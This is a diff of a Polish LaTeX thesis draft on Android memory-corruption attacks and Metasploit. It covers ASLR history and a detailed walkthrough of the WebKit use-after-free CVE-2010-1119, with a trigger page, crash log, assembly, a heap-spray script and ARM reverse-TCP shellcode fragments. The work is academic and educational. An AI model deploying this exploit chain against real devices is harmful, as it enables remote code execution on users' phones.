@@ -700,10 +700,10 @@ $4 = 0xbefffa7c
 \end{print}
 
 Aby program zaczął wykonywać dostarczony kod, adres powrotu należy nadpisać w taki sposób, aby wskazywał jedną z początkowych wartości bufora, w 
-którym zostanie umieszczony shellcode. Adres ten można uzyskać, uruchamiając program pod kontrolą debuggera \verb+gdb+. Ponieważ adres ten jest 
-przekazywany jako pierwszy argument procedury \verb+strcpy+ w linii 11 programu \ref{print:overflow}, należy odczytać wartość rejestru R0 w trakcie 
-wykonania procedury \verb+vulnerable+. Zostało to zaprezentowane na wydruku \ref{print:getsp}. Położenie stosu w kolejnych uruchomieniach programu 
-jest takie samo, ponieważ została wyłączona randomizacja przestrzeni adresowej procesu. Zostanie to opisane w punkcie \ref{section:aslr}.
+którym zostanie umieszczony \textit{shellcode}. Adres ten można uzyskać, uruchamiając program pod kontrolą debuggera \verb+gdb+. Ponieważ adres ten 
+jest przekazywany jako pierwszy argument procedury \verb+strcpy+ w linii 11 programu \ref{print:overflow}, należy odczytać wartość rejestru R0 w 
+trakcie wykonania procedury \verb+vulnerable+. Zostało to zaprezentowane na wydruku \ref{print:getsp}. Położenie stosu w kolejnych uruchomieniach 
+programu jest takie samo, ponieważ została wyłączona randomizacja przestrzeni adresowej procesu. Zostanie to opisane w punkcie \ref{section:aslr}.
 
 Omawiany program jest bardzo prosty i możliwe jest dokładne wyliczenie adresu na stosie, pod którym zostanie umieszczony przepełniany bufor. 
 W przypadku bardziej złożonych programów bardzo często sytuacja jest znacznie bardziej skompilowana. W trakcie wykonania procedury podatnej na atak, 
@@ -844,8 +844,8 @@ kodu programu w~losowych miejscach przestrzeni adresowej procesu. Randomizacji p
 \textit{Position independent code}). Odwołania do zmiennych i procedur globalnych są wtedy wykonywane pośrednio, z wykorzystaniem tablicy GOT 
 (ang. \textit{Global Table Offset}), która jest wypełniana dopiero w trakcie wykonania programu.
 
-W systemach operacyjnych opartych na jądrze Linuxa, a zatem także w systemie Android,  można zmienić ustawienia randomizacji przestrzeni adresowej poprzez zapisanie odpowiedniej 
-wartości do pliku \verb+/proc/sys/kernel/randomize_va_space+. Poszczególne wartości mają następujące znaczenie:
+W systemach operacyjnych opartych na jądrze Linuxa, a zatem także w systemie Android,  można zmienić ustawienia randomizacji przestrzeni adresowej 
+poprzez zapisanie odpowiedniej wartości do pliku \verb+/proc/sys/kernel/randomize_va_space+. Poszczególne wartości mają następujące znaczenie:
 \begin{itemize}
 \item 0 -- Powoduje całkowite wyłączenie randomizacji.
 \item 1 -- Sprawia, że położenie stosu, kodu maszynowego programu i bibliotek jest randomizowane. Jest to domyślna wartość, gdy jądro systemu jest 
@@ -853,51 +853,82 @@ skompilowane z opcją \verb+CONFIG_COMPAT_BRK+.
 \item 2 -- Włącza także randomizację położenia sterty w pamięci procesu. Wartość ta jest ustawiona, gdy opcja \verb+CONFIG_COMPAT_BRK+ jest wyłączona.
 \end{itemize}
 
-Randomizacja przestrzeni adresowej procesu w systemie Android była wprowadzana stopniowo. W systemach w wersji 1.x oraz 2.x dostępna była jedynie znikoma 
-funkcjonalność -- randomizacja dotyczyła tylko stosu procesu. Znaczące rozszerzenia zostały wprowadzone dopiero w wersjach 4.x. W wersji 4.0 w jądrze 
-systemu została zaimplementowana randomizacja sterty oraz segmentów kodu. Jednak jądro systemu było skompilowane z włączoną opcją \verb+CONFIG_COMPAT_BRK+ 
-ze względu na występowanie przestarzałych programów zakładających położenie sterty pod stałym adresem. Z tego powodu położenie sterty nie podlegało 
-randomizacji. Opcja ta została wyłączona dopiero w wersji 4.0.3. W systemie Android w wersjach 4.0.x także kod maszynowy programów systemowych nie był 
-niezależny od pozycji i z tego powodu nie podlegał randomizacji. Zostało to naprawione dopiero w wersji 4.1.
+Randomizacja przestrzeni adresowej procesu w systemie Android była wprowadzana stopniowo. W systemach w wersji 1.x oraz 2.x dostępna była jedynie 
+znikoma funkcjonalność -- randomizacja dotyczyła tylko stosu procesu. Znaczące rozszerzenia zostały wprowadzone dopiero w wersjach 4.x. W wersji 4.0 
+w jądrze systemu została zaimplementowana randomizacja sterty oraz segmentów kodu. Jednak jądro systemu było skompilowane z włączoną opcją 
+\verb+CONFIG_COMPAT_BRK+ ze względu na występowanie przestarzałych programów zakładających położenie sterty pod stałym adresem. Z tego powodu położenie 
+sterty nie podlegało randomizacji. Opcja ta została wyłączona dopiero w wersji 4.0.3. W systemie Android w wersjach 4.0.x także kod maszynowy programów 
+systemowych nie był niezależny od pozycji i z tego powodu nie podlegał randomizacji. Zostało to naprawione dopiero w wersji 4.1.
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%
+% ROZDZIAŁ 3
+%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
 
 \chapter{Przykłady ataków i ich implementacja w narzędziu Metasploit}
 
 \section{Framework Metasploit}
 
-\section{Błąd typu \textit{use-after-free} w bibliotece Webkit}
+% ogolnie opisać matesploita, 
+% materiały: 
+%  praca dla samsunga
+%  msf_user_guide.pdf
 
-\iffalse
-% szablon wydruku
+\section{podatności w bibliotece Webkit}
+
+WebKit jest silnikiem przeglądarki internetowej rozwijanym na zasadach otwartego oprogramowania. Biblioteka ta odpowiada za przetwarzanie zawartości 
+stron internetowych (tj. kodu HTML, skryptów, arkuszy stylów CSS, XSL), a następnie wyświetlenie rezultatu. Webkit składa się z dwóch głównych 
+  komponentów:
+\begin{itemize}
+\item WebCore -- Zapewnia obsługę obiektowego modelu dokumentu DOM (ang. \textit{Document Object Model}) oraz grafiki wektorowej SVG (ang. 
+\textit{Scalable Vector Graphics}). Komponent ten także renderuje treść strony internetowej.
+\item JavaScriptCore - Dostarcza silnik do obsługi języka JavaScript.
+\end{itemize}
+
+Biblioteka Webkit jest używana przez wiele popularnych przeglądarek internetowych, m.~in. Google Chrome oraz Safari. Biblioteka ta jest również 
+dostarczana wraz systemami operacyjnymi Android oraz iOS (system operacyjny firmy Apple dedykowany dla telefonów iPhone), w których wykorzystywana jest 
+przez domyślne aplikacje do przeglądania stron internetowych i przez programy obsługujące pocztę e-mail.  
+
+CVE (ang. \textit{Common Vulnerabilities and Exposures}) jest katalogiem podatności oraz zagrożeń dotyczących bezpieczeństwa informacji w systemach 
+informatycznych. System ten jest zarządzany przez organizację MITRE. Każde zgłoszenie otrzymuje unikalny identyfikator i zawiera krótki opis podatności,
+potencjalne ryzyka oraz wersje oprogramowania, w których występuje błąd. Identyfikatory CVE są uznawane za standard w systemach do wymiany informacji o 
+zagrożeniach. Każde zgłoszenie jest także oceniane w skali punktowej CVSS (ang. \textit{Common Vulnerability Scoring System}), dzięki której łatwo można
+ocenić, na ile dane zgłoszenie jest poważne. W latach 2010 -- 2011 zostało zgłoszonych ponad 200 podatności dotyczących biblioteki Webkit, spośród 
+których ok. 80\% pozwalało na wykonanie dostarczonego przez atakującego kodu. Szczegóły większości z tych błędów nie są publicznie dostępne, jednak na 
+portalach poświęconych bezpieczeństwu, np. \cite{exploitdb}, \cite{packetstorm}, można znaleźć przykłady ataków wykorzystujących niektóre podatności.
+
+W kolejnych punktach zostaną omówione wybrane błędy w bibliotece Webkit występujące także w systemie Android. Poniższe przykłady wymagają interakcji 
+ze strony użytkownika, który musi otworzyć w przeglądarce internetowej specjalnie spreparowaną stronę HTML. Na dołączonej płycie CD znajdują się 
+moduły frameworku Metasploit, które umożliwiają przeprowadzenie ataku.
+
+\subsection{CVE-2010-1119}
+
 \begin{print}
 \begin{verbatim}
-\end{verbatim}
-\caption{}
-\label{print:}
-\end{print}
-\fi
-
-\begin{print}
-\begin{verbatim}
-<html>
-    <head>
-        <script language="JavaScript">
-            function heap() {
-                var id = document.getElementById("target");
-                var attribute = id.getAttributeNode('id');
-                nodes = attribute.childNodes;
-                document.body.removeChild(id);
-                attribute.removeChild(nodes[0]);
-                setTimeout(function () {
-                    alert("freeze");
-                    nodes[0].textContent
-                }, 0);
-            }
-        </script>
-    </head>
-    <body onload=heap()>
-        <p id=target></p>
-    </body>
-</html>
+ 1: <html>
+ 2:   <head>
+ 3:     <script language="JavaScript">
+ 4:       function heap() {
+ 5:         var p_node = document.getElementById("target");
+ 6:         var id_attribute = p_node.getAttributeNode('id');
+ 7:         nodes = id_attribute.childNodes;
+ 8:         document.body.removeChild(p_node);
+ 9:         id_attribute.removeChild(nodes[0]);
+10:         setTimeout(function () {
+11:           for (var i = 0; i < 10000; i++) {
+12:             var s = new String(unescape("\u4141\u4141"));
+13:           }
+14:           alert("freeze");
+15:           nodes[0].textContent;
+16:         }, 0);
+17:       }
+18:     </script>
+19:   </head>
+20:   <body onload=heap()>
+21:     <p id=target></p>
+22:   </body>
+23: </html>
 \end{verbatim}
 \caption{Treść strony HTML, która powoduje wystąpienie błędu}
 \label{print:use-after-free-html}
@@ -905,35 +936,33 @@ niezależny od pozycji i z tego powodu nie podlegał randomizacji. Zostało to n
 
 \begin{print}
 \begin{verbatim}
-setTimeout(function () {
-    for (var i = 0; i < 70000; i++) {
-        var s = new String(unescape("\u0058\u0058"));
-    };
-
-    var scode = unescape("\u0060\u0060");
-    var nops = unescape("#{encoded_nops}");
-    var shell = unescape("#{encoded_shellcode}");
-    do {
-        scode += scode;
-        nops += nops;
-    } while (scode.length <= 0x1000);
-    nops += shell
-    target = new Array();
-    for (i = 0; i < 300; i++) {
-        if (i < 130) target[i] = scode;
-        if (i > 130) target[i] = nops;
-
-        document.write(target[i]);
-        document.write("<br />");
-        if (i > 250) {
-            alert("freeze");
-            nodes[0].textContent
-        }
-    }
-}, 0);
+I/DEBUG   (   28): pid: 295, tid: 307  >>> com.android.browser <<<
+I/DEBUG   (   28): signal 11 (SIGSEGV), fault addr 41414195
+I/DEBUG   (   28):  r0 41414141  r1 004a0460  r2 000000de  r3 00000005
+I/DEBUG   (   28):  r4 004a0460  r5 48cc2048  r6 483d31c0  r7 485a53c8
+I/DEBUG   (   28):  r8 485a5d88  r9 4374ef1c  10 4374ef04  fp 00373b40
+I/DEBUG   (   28):  ip 00b88d08  sp 485a5140  lr aa0482ab  pc aa04a57a  
+cpsr 60000030
+I/DEBUG   (   28):          #00  pc 0004a57a  /system/lib/libwebcore.so
+I/DEBUG   (   28):          #01  pc 001ae354  /system/lib/libwebcore.so
+I/DEBUG   (   28):          #02  pc 0000c0de  /system/lib/libwebcore.so
+I/DEBUG   (   28):          #03  pc 001cbf14  /system/lib/libwebcore.so
 \end{verbatim}
-\caption{Wypełnienie stery wartościami, które umożliwiają wykonanie dostarczonego kodu}
-\label{print:heap-spray}
+\caption{Log zapisany po zakończeniu procesu błędem}
+\label{print:stacktrace}
+\end{print}
+
+\begin{print}
+\begin{verbatim}
+4a578:	ldr	r0, [r4, #0]
+4a57a:	ldr	r2, [r0, #84]	; 0x54
+4a57c:	adds	r0, r4, #0
+4a57e:	blx	r2
+\end{verbatim}
+%4a580:	subs	r0, #1
+%4a582:	cmp	r0, #11
+\caption{Instrukcje assemblera, w trakcie których dochodzi do błędu}
+\label{print:webcore-asm}
 \end{print}
 
 
@@ -948,7 +977,7 @@ setTimeout(function () {
 \tikzstyle{Sblock}=[block, minimum width=2cm]
 
 \node[XLblock] at (0,0) [fill=blue!20] {\LARGE NOP + shellcode};
-\node[blank] at (4,0) {0x00680000};
+\node[blank, anchor=south west] at (4,1) {0x00680000};
 \node[XLblock] at (0,2) [fill=blue!20] {\LARGE NOP + shellcode};
 \node[blank] at (4,4) {0x00600060};
 \node[XLblock] (nop) at (0,4) [fill=blue!20] {\LARGE NOP + shellcode};
@@ -956,13 +985,16 @@ setTimeout(function () {
 \node[blank] at (4,8) {0x00580058};
 \node[XLblock] (jump) at (0,8) [fill=yellow!20] {\LARGE 0x00600060};
 \node[Sblock] at (1,10) [fill=red!20] {};
+\node[blank, anchor=south west] at (4,11) {0x00547000};
 \node[XLblock] at (0,11) [fill=yellow!20] {\LARGE 0x00600060};
 \node[Sblock] at (3,13) [fill=red!20] {};
+\node[Sblock] at (0,13) [fill=red!20] {};
 \node[Sblock] at (1,14) [fill=green!20] {\tiny 0x00580058};
 \node[Sblock] at (2,14) [fill=green!20] {\tiny 0x00580058};
 \node[Sblock] at (2,15) [fill=red!20] {};
 \node[Sblock] at (0,16) [fill=red!20] {};
 \node[Sblock] at (1,16) [fill=green!20] {\tiny 0x00580058};
+\node[Sblock] at (3,16) [fill=red!20] {};
 \node[Sblock] at (0,17) [fill=green!20] {\tiny 0x00580058};
 \node[Sblock] at (3,17) [fill=green!20] {\tiny 0x00580058};
 \node[Sblock] at (2,18) [fill=red!20] {};
@@ -983,8 +1015,139 @@ setTimeout(function () {
 \label{figure:use-after-free-heap}
 \end{figure}
 
+\begin{print}
+\begin{verbatim}
+ 1: setTimeout(function () {
+ 2:   for (var i = 0; i < 70000; i++) {
+ 3:       var s = new String(unescape("\u0058\u0058"));
+ 4:   }
+ 5:   var scode = unescape("\u0060\u0060");
+ 6:   var nops = unescape("#{encoded_nops}");
+ 7:   do {
+ 8:     scode += scode;
+ 9:     nops += nops;
+10:   } while (scode.length <= 0x1000);
+11:   var shell = unescape("#{encoded_shellcode}");
+12:   nops += shell
+13:   target = new Array();
+14:   for (i = 0; i < 300; i++) {
+15:     if (i < 130) target[i] = scode;
+16:     if (i > 130) target[i] = nops;
+17:     document.write(target[i]);
+18:     document.write("<br />");
+19:     if (i > 250) {
+20:       alert("freeze");
+21:       nodes[0].textContent
+22:     }
+23:   }
+24: }, 0);
+\end{verbatim}
+\caption{Wypełnienie stery wartościami, które umożliwiają wykonanie dostarczonego kodu}
+\label{print:heap-spray}
+\end{print}
 
-\section{Tworzenie shellcode'u}\label{section:shellcode}
+Podatność w bibliotece Webkit o identyfikatorze CVE-2010-1119 została wykryta przez Vincenzo Iozzo i Ralfa Philippa Weinmanna podczas zawodów Pwn2Own 
+towarzyszących konferencji CanSecWest w 2010 roku. Została użyta w trakcie tych zawodów do przeprowadzenia skutecznego włamania na telefon iPhone. 
+W obsłudze funkcji \verb+removeChild()+ w języku JavaScript został wykryty błąd, w wyniku którego możliwe jest odwołanie do wskaźnika do pamięci, która 
+wcześniej została zwolniona. Błąd ten może spowodować nieoczekiwane zamknięcie aplikacji przetwarzającej odpowiednie przygotowaną stronę HTML lub 
+umożliwić wykonanie przekazanego kodu. Biblioteka Webkit dostarczana z systemem Android także zawiera wykrytą podatność. Występuje ona w systemach w 
+wersji mniejszej niż 2.3.
+
+W trakcie przetwarzania przez bibliotekę Webkit strony HTML z wydruku \ref{print:use-after-free-html} dochodzi do błędu. Treść tej strony składa się z 
+jednego znacznika akapitu \verb+<p>+ w linii 21. Znacznik ten zawiera atrybut \verb+id+ o wartości \verb+target+. Podczas ładowania strony HTML tworzony 
+jest obiektowy model dokumentu (ang. \textit{Document Object Model, DOM}) reprezentujący strukturę znaczników HTML. Z poziomu języka JavaScript możliwe 
+jest modyfikowanie tej struktury. Po załadowaniu treści strony wykonywana jest funkcja JavaScript \verb+heap()+. W linii 5 na zmienną lokalną 
+\verb+p_node+ przypisywany jest węzeł reprezentujący znacznik o identyfikatorze \verb+target+, czyli znacznik akapitu z linii 21. Następnie na zmienna 
+lokalną \verb+id_attribute+ przypisywany jest węzeł związany z atrybutem \verb+id+. W linii 7 na zmiennej globalnej zapisywana jest tablica z elementami 
+potomnymi węzła \verb+id_attribute+. W tym przypadku jest to tablica jednoelementowa, która składa się z napisu \verb+target+. W linii 8 ze struktury 
+dokumentu usuwany jest węzeł, który wcześniej został zapisany na zmiennej \verb+p_node+. Powoduje to, że zmienna \verb+p_node+ stanowi jedyną referencję 
+do tego węzła. W linii 9 z węzła atrybutu \verb+id+, do którego referencją jest zmienna \verb+id_attribute+, usuwany jest element potomny, czyli napis 
+\verb+target+. Metoda \verb+setTimeout()+ umożliwia wykonanie funkcji przekazanej w pierwszym argumencie po wyrażonym w milisekundach opóźnieniu 
+przekazanym w drugim argumencie. Pierwszym argumentem metody \verb+setTimeout()+ z linii 10 jest anonimowa funkcja, czyli taka, której treść jest 
+zdefiniowana w miejscu. Na drugim argumencie przekazywane jest zerowe opóźnienie.
+
+Zakres widoczności zmiennych lokalnych \verb+p_node+ i \verb+id_attribute+ rozciąga się do końca funkcji \verb+heap()+ zdefiniowanej w liniach 4 -- 17. Po
+zakończeniu tej funkcji nie istnieje żadne odwołanie do węzłów dokumentu, na które wcześniej wskazywały zmienne lokalne. Z powodu nieprawidłowej 
+implementacji zarządzania pamięcią w bibliotece Webkit następuje zwolnienie pamięci, w której przechowywane były wewnętrzne dane związane z węzłami,
+które zostały usunięte ze struktury dokumentu. Zwalniana jest także pamięć związana z elementem potomnym atrybutu \verb+id+, do którego istnieje 
+odwołanie w globalnej tablicy \verb+nodes+.
+
+Następnie wykonywana jest anonimowa funkcja zdefiniowana w liniach 11 -- 15. Na początku tworzonych jest 10000 nowych, czterobajtowych napisów, 
+których binarna reprezentacja będzie równa 0x41414141. Z dużym prawdopodobieństwem na któryś z tych napisów zostanie ponownie przydzielony obszar 
+pamięci, do którego istnieje odwołanie w globalnej tablicy \verb+nodes+. W linii 14 wykonywana jest metoda \verb+alert()+, co powoduje wyświetlenie 
+okienka z komunikatem i guzikiem do potwierdzenia. W tym czasie wykonanie kodu JavaScript zostaje wstrzymane. Jest to dogodny moment do podpięcia się 
+do procesu przeglądarki debuggerem GDB, który umożliwia dokładną analizę pamięci procesu, stanu rejestrów i wykonywanych instrukcji. W linii 15 
+następuje odwołanie do wcześniej zwolnionej pamięci. Jeżeli jeden z napisów utworzonych w linii 12 został utworzony pod adresem, do którego następuje 
+odwołanie, to proces przeglądarki kończy się błędem. Do logu systemowego zapisywane są szczegółowe informacje o zakończonym procesie, m. in. wartości 
+rejestrów i dane znajdujące się na szczycie stosu. Przykład takiego zrzutu stanu procesu znajduje się na wydruku \ref{print:stacktrace}. Wynika z niego,
+że proces został zakończony, ponieważ wykonał odwołanie do niepoprawnego adresu pamięci 0x41414195. W rejestrze R0 znajdowała się wartość
+0x41414141, czyli wartość jednego z napisów utworzonego w linii 12 na wydruku \ref{print:use-after-free-html}. Gdy doszło do błędu licznik instrukcji 
+miał wartość 0xaa04a57a i wskazywał na instrukcję w bibliotece \verb+libwebcore.so+ pod adresem 0x4a57a.
+
+Na wydruku \ref{print:webcore-asm} znajdują się instrukcje assemblera biblioteki \verb+libwebcore.so+, których wykonanie spowodowało błąd programu.
+Instrukcja 4a578 pobiera do rejestru R0 wartość spod adresu zapisanego w rejestrze R4. Podczas wykonania programu wczytana została wartość 
+0x41414141. Następnie do rejestru R2 wczytywana jest wartość spod adresu znajdującego się w R0 powiększonego o 0x54 bajtów, czyli 0x41414195.
+Adres ten nie należy do przestrzeni adresowej procesu i próba odczytania jego zawartości spowodowała błąd. Jednak gdyby adres ten był poprawny, 
+kolejne instrukcje zostałyby wykonane. Instrukcja 4a57c kopiuje zawartość rejestru R4 do R0, a następna instrukcja powoduje skok do podprogramu, 
+którego adres początku kodu znajduje się w rejestrze R2. 
+
+Należy zauważyć, że wartość rejestru R0 może być kontrolowana przez atakującego. Wartość 0x41414141 w powyższym przykładzie może być dowolnie zmieniona.
+Wykorzystując technikę \textit{heap spray} możliwe jest także ustawienie dowolnej wartości rejestru R2 i spowodowanie, aby program zaczął wykonywać 
+dostarczony kod maszynowy. Technika ta polega na spowodowaniu, aby program wykonywał alokacje dużych bloków pamięci o pożądanej zawartości. może być to 
+wykonane, na przykład poprzez utworzenie w kodzie JavaScript długich napisów zawierających odpowiednią treść, a następnie ich zwielokrotnienie. 
+Koniecznie jest także oszacowanie adresu pamięci, pod którym zostaną umieszczone przekazane dane. Można tego dokonać wykorzystując sposób, w jaki 
+przydzielana jest pamięć. Początkowy zakres sterty w trakcie działania programu zazwyczaj ulega fragmentacji i nie występują w nim odpowiednio długie 
+spójne, niewykorzystane bloki. W takim przypadku sterta jest powiększana i przydzielany jest pierwszy dostatecznie długi fragment pamięci. Początkowy 
+rozmiar sterty i adresy, pod którymi się znajduje, można odczytać z pliku \verb+/proc/<pid>/maps+:
+\begin{verbatim}
+# cat /proc/384/maps | grep heap
+0000a000-00547000 rwxp 0000a000 00:00 0          [heap]
+\end{verbatim}
+Na potrzeby kilku pierwszych alokacji pamięci mogą być wykorzystane spójne fragmenty pamięci, które w trakcie działania programu były już użyte i 
+zostały zwolnione. Natomiast przy kolejnych alokacjach będą zwracane bloki pamięci pamięci począwszy od adresu 0x00547000.
+
+Schemat pamięci, który umożliwia wykonanie dostarczonego w treści strony kodu, przedstawiony jest na rysunku \ref{figure:use-after-free-heap}.
+Różowe prostokąty oznaczają zaalokowaną i wykorzystywaną przez program pamięć. Kolorem zielonym zaznaczono fragmenty pamięci, w których są utworzone
+krótkie napisy, które zawierają oszacowany adres, pod którymi znajdą się kolejne dane. Aby atak mógł się powieść, jeden z takin napisów musi zostać 
+umieszczony w miejscu, z którego biblioteka \verb+libwebcore.so+ w instrukcji 4a578 pobiera wartość rejestro R0. Zostało to oznaczone kolorem oliwkowo 
+zielonym. Bloki pamięci utworzone poprzez \textit{heap spray} zawierają dwa rodzaje zawartości. Żółte protokąty przedstawiąją pamięć wypełnioną
+wartością, która zostanie wczytana do rejestru R2 w instrukcji 4a57a. Wartość ta powinna być adresem pamięci, w którym znajduje się przekazany kod 
+maszynowy. Bloki z kodem poprzedzonym sekwencję instrukcji NOP są koloru fioletowego. Skok do tego kodu zostanie wykonany w instrukcji 4a57e.
+
+W pełni funkcjonalny atak składa się ze strony HTML z wydruku \ref{print:use-after-free-html}, w którym wywołanie funkcji \verb+setTimeout()+ 
+w liniach 10~--~16 jest zastąpione jej zmodyfikowaną wersją z wydruku \ref{print:heap-spray}. Konstrukcja \verb+#{zmienna}+ oznacza, że w miejscu
+jej wystąpienia powinien zostać wstawiony odpowiednio zakodowany kod maszynowy instrukcji. Wykonanie przedstawionej funkcji JavaScript powoduje 
+zaaranżowanie pamięci na stercie tak, jak jest to opisane w poprzednich akapitach. W liniach 2~--~4 tworzona jest duża ilość napisów, które zawierają 
+adres pamięci, w której zostaną umieszczone kolejne dane. W liniach 5~--~10 na zmiennych \verb+scode+ i \verb+nops+ zapisywane są dwa rodzaje napisów, 
+których długość wynosi 0x1000 bajtów. Napis \verb+nops+ składa się z wielokrotnie powtórzonego kodu maszynowego instrukcji NOP. Natomiast napis 
+\verb+scode+ jest wypełniony wartościami 0x00600060. Jest to adres, pod którym powinny zostać umieszczone bloki pamięci zawierające instrukcje NOP. 
+W liniach 11 i 12 do napisu \verb+nops+ doklejany jest \textit{shellcode}, który zostanie wykonany w trakcie ataku. Tworzenie \textit{shellcode'u}
+zostanie opisane w punkcie \ref{section:shellcode}. W liniach 14~--~23 wykonywana jest pętla, w której w każdym obrocie do treści strony dopisywany 
+jest jeden z napisów \verb+scode+ lub \verb+nops+. Powoduje to, że biblioteka Webkit na każdy z tych napisów alokuje kolejne bloki pamięci, a następnie
+umieszcza w nich przekazaną zawartość. W pierwszych 130 iteracjach kopiowany jest napis \verb+scode+, który zawiera adres pamięci. Następnie 120 razy
+kopiowana jest sekwencja instrukcji NOP zakończonych \textit{shellcode'em}. W kolejnym obrocie pętli (linie 19~--~22) następuje odwołanie do pamięci, 
+która została zwolniona, a następnie nadpisana nowymi wartościami. Powoduje to wykonanie instrukcji z wydruku \ref{print:webcore-asm}, w trakcie którego 
+do rejestrów R0 i R2 zapisane są przekazane wartości i wykonywany jest skok do \textit{shellcode'u}.
+
+\subsection{CVE-2010-1807}
+
+% http://trac.webkit.org/changeset/64706
+% https://security-tracker.debian.org/tracker/CVE-2010-1807
+% http://imthezuk.blogspot.com/2010/11/float-parsing-use-after-free.html
+
+\iffalse
+% szablon wydruku
+\begin{print}
+\begin{verbatim}
+\end{verbatim}
+\caption{}
+\label{print:}
+\end{print}
+\fi
+
+
+
+\section{Tworzenie \textit{shellcode'u}}\label{section:shellcode}
 
 \begin{print}
 \begin{verbatim}
@@ -1046,7 +1209,7 @@ int main(int argc, char *argv[]) {
 \end{print}
 
 
-\begin{print}
+\begin{print}[p]
 \begin{verbatim}
  1: // socket(PF_INET, SOCK_STREAM, 0);
  2: "\x01\x21"          // 	mov	r1, #1
@@ -1100,9 +1263,41 @@ int main(int argc, char *argv[]) {
 \label{print:reverse_tcp_asm}
 \end{print}
 
+\iffalse
+Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla non scelerisque neque, eget blandit enim. Quisque lacinia turpis ipsum, sit amet pellentesque felis convallis ac. Morbi nulla felis, rutrum et massa et, laoreet interdum quam. Nam eget iaculis sem. Sed cursus felis mauris, at sagittis turpis convallis vel. Fusce facilisis lobortis lacus a iaculis. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos. Suspendisse vel auctor dolor. Donec id mattis purus. Nam tempor tristique tellus, aliquam pharetra ligula. Pellentesque facilisis in dui ut mattis. Proin neque libero, ullamcorper sed risus nec, commodo dictum quam. Mauris ut erat dapibus risus elementum bibendum.
 
-Numery przerwać systemowych można znaleźć w pliku \verb+/usr/include/asm/unistd.h+. Ponieżej zostały wypisane definicje potrzebnych .., tj. 
-\verb+socket+, \verb+connect+, \verb+dup2+, \verb+execve+
+Nunc eu mattis dui, sed convallis neque. Nulla dictum tincidunt elit quis aliquet. In vehicula purus vitae diam congue, nec tempus dolor egestas. Ut non libero tortor. Nullam nec ullamcorper sem. Mauris rhoncus egestas mauris, sed auctor est pellentesque at. Vivamus non lorem vel quam cursus auctor.
+
+Donec consectetur aliquet lorem, vitae dapibus augue malesuada id. Integer ac cursus elit. Aliquam malesuada orci nec vulputate interdum. Sed rhoncus velit diam, sit amet porttitor sapien fermentum ac. Aliquam erat volutpat. Cras eu consequat nisi. Donec vitae velit auctor, laoreet magna eu, hendrerit risus. Quisque pretium velit molestie dolor laoreet dapibus. Suspendisse potenti. Etiam purus libero, ultricies non pretium vitae, condimentum vitae eros.
+
+Ut ornare dolor arcu, non vestibulum ipsum convallis pellentesque. Maecenas elementum nisi at sapien tempor, non scelerisque odio ullamcorper. Cras ut fermentum urna, at aliquet sem. Vestibulum ante ipsum primis in faucibus orci luctus et ultrices posuere cubilia Curae; Duis condimentum risus et magna venenatis, quis eleifend eros commodo. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla in ante nisi. Nam iaculis id mi eget eleifend. Curabitur massa urna, hendrerit et pretium sit amet, cursus in est. Suspendisse volutpat magna sit amet odio rutrum convallis nec ut ante. Mauris mi lacus, posuere at sodales sed, venenatis et quam.
+
+Praesent rutrum nisl a ipsum facilisis, quis tincidunt velit laoreet. Quisque odio purus, posuere ut tortor et, gravida dictum felis. In et elit sed felis hendrerit dignissim at vel est. Donec sem mauris, imperdiet eu sollicitudin at, dignissim a odio. Sed a lectus a urna volutpat bibendum. Sed in bibendum dolor. Nam condimentum tellus non sagittis fermentum. Quisque ac diam eu urna ultrices fringilla eget porttitor nisi. Mauris semper convallis lectus a egestas. Morbi pellentesque sapien quis lacus pellentesque vehicula. Aliquam mollis metus et fermentum tempus. Maecenas ornare egestas hendrerit. Fusce at lorem vel diam tristique feugiat. Quisque quis egestas justo, id gravida neque. Sed in pellentesque eros.
+
+Donec volutpat pharetra quam, eget viverra sapien feugiat sit amet. Proin in lorem hendrerit, commodo lectus in, convallis quam. Sed venenatis erat a tristique semper. Duis vitae ligula laoreet, accumsan arcu quis, fringilla ipsum. Nam volutpat enim sed mauris gravida, eu convallis nisl luctus. Fusce vulputate dui ac tellus aliquet commodo. Phasellus tempus elementum ante, et lacinia augue cursus non. Aliquam consectetur semper risus ac tincidunt. Cras luctus adipiscing tellus, id consectetur erat sollicitudin id.
+
+Proin fringilla, ligula ut molestie vehicula, turpis velit fermentum metus, id lobortis mauris purus at eros. Nunc lorem orci, gravida nec accumsan quis, gravida vel erat. Morbi quis lacus sit amet eros vestibulum feugiat. Vestibulum laoreet leo et sapien mollis, fringilla gravida ante scelerisque. Maecenas facilisis sed libero ac egestas. Mauris feugiat risus at fringilla vehicula. Phasellus pharetra lorem sit amet ligula semper rhoncus. In vel euismod nulla, nec tincidunt mi.
+
+Mauris et vehicula libero. Donec fringilla ligula ac consequat sodales. Ut in sodales libero. Etiam blandit tempor ante et commodo. Aenean molestie tellus enim, eget fringilla eros suscipit vitae. Interdum et malesuada fames ac ante ipsum primis in faucibus. Quisque vitae elit sed est feugiat aliquam. Sed vitae tincidunt nisl. Quisque posuere velit turpis, a venenatis elit rutrum non. Quisque vestibulum vel est et interdum. Pellentesque ante nisi, posuere id tortor in, adipiscing condimentum orci. Suspendisse potenti. Suspendisse hendrerit, nunc ac adipiscing accumsan, est sapien lacinia velit, sit amet fringilla lectus massa a nisi. Pellentesque id felis nec ipsum volutpat laoreet.
+
+Aenean eget erat a ante laoreet tempor. In vel massa quis mauris dapibus dignissim. Etiam blandit ligula vitae euismod posuere. In scelerisque consequat leo nec scelerisque. Nullam placerat leo mauris, non venenatis ipsum viverra eu. Fusce et pulvinar neque, sed facilisis mi. Nam aliquet eu nunc id semper. Sed mauris lacus, euismod eu facilisis vel, rhoncus vitae mauris. Nam mauris enim, aliquet non elementum ut, sollicitudin vel odio. Donec adipiscing elementum felis. Aenean a ligula et metus sollicitudin convallis vitae sit amet enim. Morbi sit amet sem sed nisl vehicula lacinia non a nisi. Vestibulum a nulla eget nibh aliquam suscipit et condimentum nunc.
+
+Suspendisse convallis, mi et ultrices malesuada, ante tortor auctor eros, ac lacinia diam neque et felis. Vivamus iaculis laoreet vulputate. Suspendisse sit amet urna erat. Vivamus dignissim molestie lorem, id feugiat leo condimentum vel. Aliquam accumsan metus vel euismod posuere. Donec sollicitudin purus vitae massa pretium interdum. Aliquam sit amet neque nibh.
+
